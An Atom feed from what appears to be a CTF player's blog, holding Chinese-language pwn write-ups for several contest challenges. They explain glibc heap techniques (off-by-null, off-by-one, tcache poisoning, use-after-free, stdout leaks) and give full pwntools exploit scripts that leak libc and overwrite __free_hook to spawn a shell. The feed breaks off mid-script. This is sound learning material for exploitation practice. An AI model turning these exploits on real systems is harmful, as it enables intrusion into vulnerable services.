<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ME_dition</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-01-16T03:44:40.898Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ME_dition</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>off_by_none_2.31</title>
    <link href="http://example.com/2022/01/16/off_by_none_2.31/"/>
    <id>http://example.com/2022/01/16/off_by_none_2.31/</id>
    <published>2022-01-16T02:28:49.627Z</published>
    <updated>2022-01-16T03:44:40.898Z</updated>
    
    <content type="html"><![CDATA[<p>在2.29的版本后加入了这样的防护</p><pre><code>  if (__glibc_unlikely (chunksize(p) != prevsize))    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</code></pre><p>/* consolidate backward */<br>    if (!prev_inuse(p)) {<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((long) prevsize));<br>      if (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (“corrupted size vs. prev_size while consolidating”);<br>      unlink_chunk (av, p);<br>    }</p><pre><code>// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</code></pre><p>也就是说上一chunk的size必须要与该chunk的prevsize一致并且还要通过unlink的检测。</p><p>所以fake_chunk必须可以控制其size,fd,bk使其 FD-&gt;bk == p ; BK-&gt;fd == p 。 之后通过溢出修改某一chunk(D)的prevsize和inuse位为\x00 ，此时free(D)与p 形成合并，p与其FD,BK进行unlink操作。即可形成overloap</p><p><img src="https://s2.loli.net/2022/01/16/nQgS4yhpcwZKD7e.png"></p><p>以Balsn_CTF_2019-PlainText举例：</p><pre><code>   for i in range(16):      add(0x10,&#39;fill&#39;)   for i in range(16):      add(0x60,&#39;fill&#39;)   for i in range(9):      add(0x70,&#39;fill&#39;)   for i in range(5):      add(0xC0,&#39;fill&#39;)   for i in range(2):      add(0xE0,&#39;fill&#39;)   add(0x170,&#39;fill&#39;)   add(0x190,&#39;fill&#39;)# 49   add(0xa9D0,&#39;addralign&#39;) # 50</code></pre><h2 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h2><p>如果bin里有堆，最好把他申请出来，然后申请到合适的chunk大小使得下一chunk的地址的后16位为\x00 (实际远程时无法控制低4位的大小，需要进行爆破，有1/16的概率)</p><p><img src="https://s2.loli.net/2022/01/16/H9JQZ64UxNY5DK1.png"></p><h2 id="2-布局"><a href="#2-布局" class="headerlink" title="2.布局"></a>2.布局</h2><pre><code>   add(0x28,p64(0) + p64(0x241) + b&#39;\x28&#39;) # 53 fd-&gt;bk : 0xA0 - 0x18   add(0x28,&#39;pass-loss control&#39;) # 54   add(0xF8,&#39;pass&#39;) # 55   add(0x28,&#39;pass&#39;) # 56   add(0x28,&#39;pass&#39;) # 57   add(0x28,&#39;pass&#39;) # 58   add(0x28,&#39;pass&#39;) # 59   add(0x28,&#39;pass-loss control&#39;) # 60   add(0x4F8,&#39;to be off-by-null&#39;) # 61  0250</code></pre><p>其中\x28是p-&gt;fd , 0x241是p(fake_chunk的size)之后也会以这个大小与 chunk61 来合并.</p><h2 id="3-修复fd"><a href="#3-修复fd" class="headerlink" title="3.修复fd"></a>3.修复fd</h2><p>此时BK-&gt;fd还没有修复好，为了在修复的同时不破坏掉size，需要把它放入fastbin.同时为了利用地址信息需要把 B , C , A 依次free掉</p><p><img src="https://s2.loli.net/2022/01/16/EUSDhnVw4gTo8KI.png"></p><p>所以，需要先将Tcache 填满 ， 然后依次 free chunk B C A ，清空Tcache ，申请回chunk(A)，复写fd,使其指向p (BK-fd构造完成)</p><p>然后由于 Tcache 的 stash 机制，chunk B C 进入 Tcache，再申请回来的就是 chunk B，部分覆写使 fd 指向 fake_chunk。(FD-&gt;bk构造完成)</p><pre><code>   for i in range(7):      add(0x28,&#39;tcache&#39;)   for i in range(7):      delete(61 + 1 + i)   delete(54)     #b  0040   delete(60)     #c  0230   delete(53)     #a  0000   #a-&gt;c-&gt;b   for i in range(7):      add(0x28,&#39;tcache&#39;)# 53,54,60,62,63,64,65   add(0x28,&#39;\x10&#39;) # 53-&gt;66  a## stashed ##   add(0x28,&#39;\x10&#39;) # 54-&gt;67  b   add(0x28,b&#39;a&#39; * 0x20 + p64(0x240)) # 60-&gt;68  c   0220   gdb.attach(io)   delete(61)  #d</code></pre><h2 id="4-泄露"><a href="#4-泄露" class="headerlink" title="4.泄露"></a>4.泄露</h2><p>delete(61)  #d 后形成了overloap</p><p>利用堆重叠进行泄露</p><pre><code>add(0x140,&#39;pass&#39;) # 61show(56)libc_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - libc.sym[&quot;__malloc_hook&quot;] - 0x10 - 0x60log.success(&quot;libc_base:&quot; + hex(libc_base))__free_hook_addr = libc_base + libc.sym[&quot;__free_hook&quot;]add(0x28,&#39;pass&#39;) # 69&lt;-56add(0x28,&#39;pass&#39;) # 70&lt;-57delete(70)delete(69)show(56)heap_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - 0x1A0log.success(&quot;heap_base:&quot; + hex(heap_base))</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在2.29的版本后加入了这样的防护&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr (&amp;quot;corrupted size vs. prev_si</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>1.10长安抗疫赛</title>
    <link href="http://example.com/2022/01/13/1.12%E7%94%B5%E4%BF%A1%E6%9D%AF/"/>
    <id>http://example.com/2022/01/13/1.12%E7%94%B5%E4%BF%A1%E6%9D%AF/</id>
    <published>2022-01-13T08:47:52.315Z</published>
    <updated>2022-01-13T09:34:16.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="https://s2.loli.net/2022/01/13/HBngCYcTMOr8xF4.png"></p><p>因为用gets,可以看出这里存在溢出漏洞</p><p>可以通过溢出修改size,再free掉，形成overloap</p><pre><code>for i in range(10):   ad(&#39;/bin/sh\x00&#39;)rm(0)ad(b&#39;\x00&#39;*0x88+p64(0x90*8+1))    #tcache&lt;0x400  unsortbin&gt;0x400rm(1)ad(&#39;a&#39;)dp(2)leak = u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)base = leak-96-0x10-libc.sym[&#39;__malloc_hook&#39;]system = base + libc.sym[&#39;system&#39;]free = base + libc.sym[&#39;__free_hook&#39;]print(&quot;leak---&gt;&quot;+hex(leak))print(&quot;free---&gt;&quot;+hex(free))print(&quot;system-&gt;&quot;+hex(system))</code></pre><p>利用tcache，溢出修改fd从而打free_hook</p><pre><code>rm(6)rm(5)rm(4)ad(b&#39;\x00&#39;*0x88 + p64(0x91) + p64(free))#gdb.attach(io)ad(p64(system))ad(p64(system))rm(8)</code></pre><p>exp:<br>    #!/usr/bin/env python3<br>    #-<em>- coding:utf-8 -</em>-<br>    from pwn import *<br>    import os<br>    r   =  lambda x : io.recv(x)<br>    ra  =  lambda   : io.recvall()<br>    rl  =  lambda   : io.recvline(keepends = True)<br>    ru  =  lambda x : io.recvuntil(x, drop = True)<br>    s   =  lambda x : io.send(x)<br>    sl  =  lambda x : io.sendline(x)<br>    sa  =  lambda x, y : io.sendafter(x, y)<br>    sla =  lambda x, y : io.sendlineafter(x, y)<br>    ia  =  lambda : io.interactive()<br>    c   =  lambda : io.close()<br>    li    = lambda x : log.info(‘\x1b[01;38;5;214m’ + x + ‘\x1b[0m’)</p><pre><code>#------------------------------------------------io = process(&#39;./pwn1&#39;)context.log_level=&#39;debug&#39;elf = ELF(&#39;./pwn1&#39;)libc = ELF(&quot;./libc-2.31.so&quot;)#------------------------------------------------def ad(con):    sla(&quot;&gt;&gt; &quot;,&#39;1&#39;)    sla(&quot;content: &quot;,con)def rm(idx):    sla(&quot;&gt;&gt; &quot;,&#39;2&#39;)    sla(&quot;index: &quot;,str(idx))def md(sz, na):    sla(&#39;&gt;&gt; &#39;, &#39;4&#39;)    sla(&#39;size of it&#39;, str(sz))    sla(&#39;name&#39;, na)def dp(idx):    sla(&quot;&gt;&gt; &quot;,&#39;3&#39;)    sla(&#39;index: &#39;, str(idx))def finish():    ia()    c()def exploit():    li(&#39;exploit...&#39;)    for i in range(10):       ad(&#39;/bin/sh\x00&#39;)    rm(0)    ad(b&#39;\x00&#39;*0x88+p64(0x90*8+1))    #tcache&lt;0x400  unsortbin&gt;0x400    rm(1)    ad(&#39;a&#39;)    dp(2)    leak = u64(io.recvuntil(&quot;\x7f&quot;)[-6:]+b&#39;\x00\x00&#39;)    base = leak-96-0x10-libc.sym[&#39;__malloc_hook&#39;]    system = base + libc.sym[&#39;system&#39;]    free = base + libc.sym[&#39;__free_hook&#39;]    print(&quot;leak---&gt;&quot;+hex(leak))    print(&quot;free---&gt;&quot;+hex(free))    print(&quot;system-&gt;&quot;+hex(system))    #gdb.attach(io)    rm(6)    rm(5)    rm(4)    ad(b&#39;\x00&#39;*0x88 + p64(0x91) + p64(free))    #gdb.attach(io)    ad(p64(system))    ad(p64(system))    rm(8)#-------------------------------startif __name__ == &#39;__main__&#39;:    exploit()    finish()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/01/13/HBngCYcTMOr8xF4.png&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>1.10长安抗疫赛</title>
    <link href="http://example.com/2022/01/11/1.10%E9%95%BF%E5%AE%89%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <id>http://example.com/2022/01/11/1.10%E9%95%BF%E5%AE%89%E6%8A%97%E7%96%AB%E8%B5%9B/</id>
    <published>2022-01-11T14:55:55.632Z</published>
    <updated>2022-01-11T15:34:55.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p>明显的栈溢出漏洞</p><p><img src="https://s2.loli.net/2022/01/11/2umJ7kyoaPEqTY6.png"></p><p>leave 是 </p><p>mov esp,ebp<br>pop ebp </p><p>发现直接覆盖ret竟然不行，观察汇编发现在跳转前先将lea esp, [ecx-4]</p><p><img src="https://s2.loli.net/2022/01/11/QhXTxcqOJlWfviH.png"></p><p>因此需要先控制ecx,可以向[ebp - 4]写入想要跳转的地址（该栈上），再在此地址写入后门函数（esp, [ecx - 4]）的地址即可实现getshell。</p><p><img src="https://s2.loli.net/2022/01/11/5pNdDZ38Q4Bwsha.png"></p><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p><img src="https://s2.loli.net/2022/01/11/QZCX1uoOlDqpkf5.png"></p><p>如上图，存在off_by_one漏洞，可以利用堆重叠进行任意地址写的操作。</p><p>首先，泄露libc地址： 将unsortbin切割，通过残留的fd指针，从而泄露出地址。</p><p>其次，利用堆重叠，将一号堆溢出值二号堆的fd处，</p><p><img src="https://s2.loli.net/2022/01/11/TsUYFW9qiCrSkIl.png"></p><p>若写入的是__free_hook的地址即可实现劫持free的效果。此时向__free_hook处写入system，在__free_hook-8处写入参数”/bin/sh\x00”,再free该堆即可<br>（也可向任意的堆头处写入”/bin/sh\x00”，第一个位置将作为参数传入）</p><p><img src="https://s2.loli.net/2022/01/11/JZnAaWq9rjlLEM4.png"></p><pre><code>#!/usr/bin/python3from pwn import *context.log_level = &#39;debug&#39;elf = ELF(&#39;./pwn2&#39;)p = process(&quot;./pwn2&quot;)libc = ELF(&quot;/glibc/2.27/64/lib/libc.so.6&quot;)s      = lambda buf        : p.send(buf)sl     = lambda buf        : p.sendline(buf)sa     = lambda delim, buf : p.sendafter(delim, buf)sal    = lambda delim, buf : p.sendlineafter(delim, buf)sh     = lambda            : p.interactive()r      = lambda n=None     : p.recv(n)ru     = lambda delim      : p.recvuntil(delim)r7f    = lambda            : u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+b&quot;\x00\x00&quot;)trs    = lambda addr       : libc.address+addrgadget = lambda ins        : libc.search(asm(ins,arch=&quot;amd64&quot;)).next()tohex  = lambda buf        : &quot;&quot;.join(&quot;\\x%02x&quot;%ord(_) for _ in buf)def add(size,content):    sal(&quot;Choice: &quot;,&quot;1&quot;)    sal(&quot;size: &quot;,str(size))    sal(&quot;content: &quot;,content)def free(id):    sal(&quot;Choice: &quot;,&quot;3&quot;)    sal(&quot;idx: &quot;,str(id))def edit(id,content):    sal(&quot;Choice: &quot;,&quot;2&quot;)    sal(&quot;idx: &quot;,str(id))    sa(&quot;content: &quot;,content)def show(id):    sal(&quot;Choice: &quot;,&quot;4&quot;)    sal(&quot;idx: &quot;,str(id))for i in range(8):   add(0x88,&#39;aaaaaaaa&#39;)add(0x88,&#39;bbbbbbbb&#39;)for i in range(8):   free(i)#gdb.attach(p)add(0x28,&#39;a&#39;*8)edit(0,&#39;a&#39;*9)show(0)leak = u64(p.recvuntil(&#39;\x7f&#39;)[-6:] + b&#39;\x00\x00&#39;)      #u64(p.recvuntil(&quot;\x7f&quot;)[-6:] + b&quot;\x00\x00&quot;)base = leak-0xa-279-0x10-libc.sym[&#39;__malloc_hook&#39;]system = base+libc.sym[&#39;system&#39;]free_hook = base+libc.sym[&#39;__free_hook&#39;]print(&quot;leak----&gt;&quot;+hex(leak))print(&quot;base----&gt;&quot;+hex(base))print(&quot;free_hook--&gt;&quot;+hex(free_hook))#gdb.attach(p)add(0x18,&#39;AAAA&#39;)  #1add(0x18,&#39;BBBB&#39;)  #2add(0x18,&#39;CCCC&#39;)  #3add(0x18,&#39;DDDD&#39;)  #4free(1)add(0x18,&quot;A&quot;*0x18+&quot;\x41&quot;)free(3)free(2)add(0x38,&#39;EEEEE&#39;)payload = b&#39;a&#39;*0x18 + p64(0x21) + p64(free_hook-8)edit(2,payload)#gdb.attach(p)add(0x18,b&quot;/bin/sh\x00&quot;)  #3#gdb.attach(p)add(0x18,b&quot;/bin/sh\x00&quot; + p64(system))  #5show(3)free(3)#free(5)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h1&gt;&lt;p&gt;明显的栈溢出漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/01/11/2umJ7</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十一月十五日-stdout爆破</title>
    <link href="http://example.com/2021/11/15/11.15_stdout%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2021/11/15/11.15_stdout%E7%88%86%E7%A0%B4/</id>
    <published>2021-11-15T15:05:18.146Z</published>
    <updated>2021-11-15T17:30:17.346Z</updated>
    
    <content type="html"><![CDATA[<h1 id="stdout爆破"><a href="#stdout爆破" class="headerlink" title="stdout爆破"></a>stdout爆破</h1><p>最近做的比赛有一道没有给出show函数，所以学习了一下stdout爆破来泄露函数地址。</p><p>1.通过uaf漏洞修改fd ，指向我们提前布置好的fake_chunk。</p><p>2.利用fake_chunk修改下一chunk的size,从而可以free其下一个chunk而进入unsortbin，从而获得main_area.</p><p>3.再次利用uaf漏洞，修改unsort_chunk的低2字节，由于最后3位是确定的，所以需要爆破一位。至于错位构造size域，我们需要自行查找。</p><p>4.最后连续add两次即可将chunk分配至目标位置，覆盖stdout及其后几位即可实现泄露。</p><pre><code>new(0x10,0,p64(0) + p64(0x41))new(0x60,1,p64(0)*5 + p64(0x41))new(0x30,2,&#39;a&#39;)new(0x30,3,&#39;b&#39;)new(0x30,4,&#39;c&#39;)</code></pre><p>add出所需要的chunk , 分配0x10 是为了方便放置fake_chunk 从而修改下一chunk的size，分配0x60是因为目标地址数据以0x7f开头，方便构造size域 。</p><pre><code>edit(3,p8(0x10))new(0x30,3,p8(0x10))new(0x30,2,p64(0)+p64(0x70+0x41))                #make chunk overloap</code></pre><p><img src="https://i.loli.net/2021/11/15/cJa9RmET7qykd2w.gif"></p><p><img src="https://i.loli.net/2021/11/15/YhjDvoRKSbyrxQf.gif"></p><p><img src="https://i.loli.net/2021/11/15/xD98gkQBqCPR4ns.gif"></p><p>利用uaf漏洞修改fd指向fake_chunk，将chunk分配至fake_chunk处，并且利用fake_chunk修改下一chunk的size域。</p><pre><code>free(1)                          #make unsortbin  &amp;&amp; double freeedit(2,p64(0)+p64(0x71))         #repire chunkedit(1,p16(0x2620-0x43))</code></pre><p><img src="https://i.loli.net/2021/11/15/TLXBc36GHosbyUF.gif"></p><p>free该chunk，使其进入unsortbin ,其fd指向main_area 。利用fake_chunk修复该chunk。并且利用uaf漏洞修改unsort_chunk的fd指向目标位置。这里需要爆破一位数也就是1/16的概率。查看stdout可以使用 打印  “p /x _IO_2_1_stdout_”</p><pre><code>new(0x60,1,p16(0x2620-0x43))new(0x60,5,&quot;a&quot;*0x33+p64(0xfbad1887)+p64(0)*3+p8(0))</code></pre><p><img src="https://i.loli.net/2021/11/15/g5XKxmhiju7OJc3.png"><br>    p /x _IO_2_1_stdout_</p><p><img src="https://i.loli.net/2021/11/15/YboxiIdqlVjNJ9f.png"></p><p>连续malloc两次，从而实现地址泄露</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;stdout爆破&quot;&gt;&lt;a href=&quot;#stdout爆破&quot; class=&quot;headerlink&quot; title=&quot;stdout爆破&quot;&gt;&lt;/a&gt;stdout爆破&lt;/h1&gt;&lt;p&gt;最近做的比赛有一道没有给出show函数，所以学习了一下stdout爆破来泄露函数地址。&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十一月六日-CTF-PWN</title>
    <link href="http://example.com/2021/11/06/%E4%B8%9C%E5%8D%8E%E6%9D%AF11.6/"/>
    <id>http://example.com/2021/11/06/%E4%B8%9C%E5%8D%8E%E6%9D%AF11.6/</id>
    <published>2021-11-05T16:57:36.771Z</published>
    <updated>2021-11-15T17:34:25.171Z</updated>
    
    <content type="html"><![CDATA[<p>最近打东华杯，因为看不懂c++，所以遭重了。花了一点时间学习C++的反汇编，终于把它拿捏了。</p><h1 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h1><p>UAF漏洞，在rm函数中，并没有将指针设置为0.所以我们可以将某个chunk free 后然后直接利用md函数修改其fd指针，从而进行unsortbin_attack</p><p>add(0),free(0)后可以直接利用未消除的指针进行泄露地址</p><p>这里可以选择覆盖tcache_str为大数，下下次分配chunk时将直接进入unsortbin。<br><strong><em>这里需要格外注意的是，这里并未直接将改tcache_num设置为7 ，而是利用tcache和unsortbin的指针指向相差了0x10，因此被分配到最高地址的chunk被free时将会进入unsortbin，而其上一个被free的chunk仍进入tchche这为之后修改tchche的fd提供了方便</em></strong></p><p>第一次free:</p><p><img src="https://i.loli.net/2021/11/07/AuBT9yV2rQLozR7.png"></p><p>第二次free:</p><p><img src="https://i.loli.net/2021/11/07/CLGoyrjsJ9pPKRO.png"></p><p>也是因为未清除指针的原因，可以直接读出fd的值然后计算出__free_hook</p><p>覆盖tcache的fd为__free_hook，然后连续malloc两个chunk,free掉有“/bin/sh\x00”的chunk</p><pre><code>#! /usr/bin/python3from pwn import*io = process(&#39;./cpp2&#39;)elf = ELF(&quot;./cpp2&quot;)libc = ELF(&#39;./libc-2.31.so&#39;)r   =  lambda x : io.recv(x)rx  =  lambda x: io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)def ad(idx,size): sla(&#39;&gt;&gt;&#39;,str(1)) sla(&#39;I:&gt;&gt;&#39;,str(idx)) sla(&#39;S:&gt;&gt;&#39;,str(size))def md(idx,con): sla(&#39;&gt;&gt;&#39;,str(2)) sla(&#39;I:&gt;&gt;&#39;,str(idx)) sla(&#39;V:&gt;&gt;&#39;,con)def rm(idx): sla(&#39;&gt;&gt;&#39;,str(4)) sla(&#39;I:&gt;&gt;&#39;,str(idx))def dp(idx): sla(&#39;&gt;&gt;&#39;,str(3)) sla(&#39;I:&gt;&gt;&#39;,str(idx))ad(0,0x67)ad(1,0x67)ad(2,0x67)ad(3,0x67)rm(0)rm(1)dp(1)io.recvuntil(&#39;\n&#39;)heap = u64(io.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x12EC0 + 0x10print(&quot;heap-----&gt;&quot;+hex(heap))md(1,p64(heap))ad(4,0x67)ad(5,0x67)md(5,b&#39;\x00&#39;*0x48+b&#39;\x00&#39;*6+b&#39;\x07&#39;)#md(5,b&#39;\x00&#39;*10 + b&#39;\x07&#39;)rm(3)rm(5)dp(5)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:] + b&#39;\x00\x00&#39;)free = leak - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;] + libc.sym[&#39;__free_hook&#39;]system = leak - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;] + libc.sym[&#39;system&#39;]print(hex(leak))print(hex(free))md(3,p64(free))ad(6,0x67)md(6,b&#39;/bin/sh\x00&#39;)ad(7,0x67)md(7,p64(system))rm(6)#gdb.attach(io)io.interactive()</code></pre><h1 id="CPP2"><a href="#CPP2" class="headerlink" title="CPP2"></a>CPP2</h1><p>堆溢出漏洞</p><p>填充tcache至满，再次free进入unsorbin,截取泄露libc.</p><p>通过堆溢出漏洞修改tcache fd,进行unsortbin_attack.</p><pre><code>#! /usr/bin/python3from pwn import *sh = process(&#39;./cpp&#39;)elf = ELF(&#39;./cpp&#39;)libc = ELF(&#39;./libc-2.31.so&#39;)def ad(idx, size):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;1&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))    sh.sendlineafter(&quot;S:&gt;&gt;\n&quot;, str(size))def md(idx, content):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;2&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))    sh.sendlineafter(&quot;V:&gt;&gt;\n&quot;, content)def dp(idx):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;3&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))def rm(idx):    sh.sendlineafter(&quot;&gt;&gt;\n&quot;, &#39;4&#39;)    sh.sendlineafter(&quot;I:&gt;&gt;\n&quot;, str(idx))for i in range(9):    ad(i,0x88)for i in range(7,0,-1):    rm(i)rm(0)ad(9,0x78)dp(9)#gdb.attach(sh)leak = u64(sh.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)base = leak - 224 -0x10 - libc.sym[&#39;__malloc_hook&#39;]free = base + libc.sym[&#39;__free_hook&#39;]system = base + libc.sym[&#39;system&#39;]print(hex(leak))print(hex(free))print(hex(system))ad(1,0x88)md(1,b&#39;a&#39;*0x90 + p64(free))ad(2,0x88)md(2,b&#39;/bin/sh\x00&#39;)ad(3,0x88)md(3,p64(system))rm(2)#gdb.attach(sh)sh.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打东华杯，因为看不懂c++，所以遭重了。花了一点时间学习C++的反汇编，终于把它拿捏了。&lt;/p&gt;
&lt;h1 id=&quot;CPP&quot;&gt;&lt;a href=&quot;#CPP&quot; class=&quot;headerlink&quot; title=&quot;CPP&quot;&gt;&lt;/a&gt;CPP&lt;/h1&gt;&lt;p&gt;UAF漏洞，在rm函数中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十月二十六日-拟态-PWN</title>
    <link href="http://example.com/2021/10/26/10.24%E6%8B%9F%E6%80%81/"/>
    <id>http://example.com/2021/10/26/10.24%E6%8B%9F%E6%80%81/</id>
    <published>2021-10-26T07:24:01.140Z</published>
    <updated>2021-10-27T17:45:13.163Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnpwn"><a href="#pwnpwn" class="headerlink" title="pwnpwn"></a>pwnpwn</h1><p>简单的格式化字符串漏洞由于程序本身会打印一个当前地址，只需要减去当前函数的偏移即可获取elf基地址</p><p>通过格式化字符串漏洞泄露canary</p><p>最后用ROPgadget寻找可用gadget，用ret,劫持执行流，pop rdi ；ret传参”bin/sh”,再进入system函数</p><h1 id="bitfile"><a href="#bitfile" class="headerlink" title="bitfile"></a>bitfile</h1><p>漏洞出现在edit中，因为在读入时多出了一个字符，所以造成了off-by-one 漏洞。</p><p>观察代码，可以先泄露tchec地址，向tcache-&gt;counts[tc_idx]写入7，即填满，然后在通过构造堆重叠泄露出unsortbin，从而进行攻击。</p><pre><code>  v7 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1054, &amp;v6);  v0 = v6;  if ( v6 &lt;= 0x1F )  &#123;    if ( ptrs[v6] )    &#123;      __printf_chk(1LL, &quot;Content: &quot;);      v1 = sizes[v0];      v2 = (_BYTE *)ptrs[v0];      max_size = v1 + 1;      if ( max_size )      &#123;        v4 = &amp;v2[max_size];        do        &#123;          read(0, v2, 1uLL);          if ( *v2 == 10 )            break;          ++v2;        &#125;        while ( v2 != v4 );      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ v7;&#125;</code></pre><p>又因为在add函数中限制了chunk的大小，所以我们要通过合并堆从而泄露libc.</p><pre><code>unsigned __int64 add()&#123;  size_t v0; // rbx  size_t size_; // rbp  void *v3; // rax  size_t size; // [rsp+0h] [rbp+0h] BYREF  unsigned __int64 vars8; // [rsp+8h] [rbp+8h]  vars8 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1054, &amp;size);  v0 = size;  if ( size &lt;= 0x1F &amp;&amp; !ptrs[size] )  &#123;    __printf_chk(1LL, &quot;Size: &quot;);    __isoc99_scanf(&amp;unk_1054, &amp;size);    size_ = size;    if ( size &lt;= 0x50 )    &#123;      v3 = malloc(size);      if ( v3 )      &#123;        ptrs[v0] = v3;        sizes[v0] = size_;        puts(&quot;Done!&quot;);      &#125;      else      &#123;        puts(&quot;allocate failed&quot;);      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ vars8;&#125;</code></pre><p>申请两个tcache,重新申请一个再泄露出tcache地址，先利用tcache_bin打印出tcache的地址。</p><pre><code>rm(0)md(2,b&#39;A&#39; * 0x48 + p8(0x50 + 0x51))gdb.attach(io)rm(4)              #chunk 3 is 0xa1 ;#gdb.attach(io)ad(0, 0x48)dp(0)ru(&#39;Content: &#39;)leak = u64(ru(&#39;\n&#39;).ljust(8, b&#39;\x00&#39;))  #tcache addrheap = leak - 0x260 + 0x10 + 8   #to chunk first</code></pre><p><img src="https://i.loli.net/2021/10/25/6cjeDorwbLNGY8Z.png"></p><p>通过溢出chunk(5)修改chunk(6)的size，形成堆重叠。将tcache-&gt;counts[tc_idx]的地址写入FD,下下个堆块就会分配到此处。</p><p>将idx设置为7，那么0xa0大小的chunk将会由unsortbin管理</p><pre><code>rm(3)#gdb.attach(io)rm(11) # make 0x50 more lengmd(5,b&#39;B&#39; * 0x28 + p8(0x30 + 0x31))rm(6)rm(7)ad(6, 0x50)md(6, b&#39;A&#39; * 0x28 + p64(0x31) + p64(heap) + b&#39;\n&#39;) ad(3, 0x28)ad(4, 0x28)      #018md(4, p64(7) + b&#39;\n&#39;) # set 0xa0 chunk number as 7#gdb.attach(io)md(8,b&#39;C&#39; * 0x48 + p8(0x50 + 0x51))rm(9)#gdb.attach(io)ad(9, 0x38)dp(9)</code></pre><p>泄露libc， 将chunk(9)的size改为0xa1,形成unsortbin,然后再次malloc，通过打印，并计算出libc基址</p><pre><code>md(8,b&#39;C&#39; * 0x48 + p8(0x50 + 0x51))rm(9)ad(9, 0x38)dp(9)leak = u64(ru(&#39;\x7f&#39;)[-5:] + b&#39;\x7f\x00\x00&#39;)     #libc_base-getlibc_base = leak  - libc.sym[&#39;__malloc_hook&#39;] - 240 - 0x10li(&#39;leak: &#39; + hex(leak))li(&#39;libc_base: &#39; + hex(libc_base)) </code></pre><p>get_shell</p><p>通过同样的方式，溢出修改(13)的size,free(13) free(14)形成堆重叠，再malloc一个chunk使得可以修改(14)的fd 为 __free_hook ，再进行malloc，向__free_hook中写入system 。顺便将一个chunk写入(“/bin/sh\x00”),将其free即可</p><h1 id="old-school-amp-amp-old-school-revenge"><a href="#old-school-amp-amp-old-school-revenge" class="headerlink" title="old_school &amp;&amp; old_school_revenge"></a>old_school &amp;&amp; old_school_revenge</h1><p><img src="https://i.loli.net/2021/10/27/nPBoMijyCeAUf18.png"></p><p>依然是一个off-by-one,但是限制了大小，所以我们需要通过合并堆来形成unsortbin ，从而泄露libc</p><p>先创建若干堆，然后free掉7个填充满tchack</p><pre><code>for i in range(7):    ad(i,0x80)ad(7,0x80)ad(8,0x78)ad(9,0x78)ad(10,0x80)ad(11,0x70)ad(12,0x70)for i in range(7):    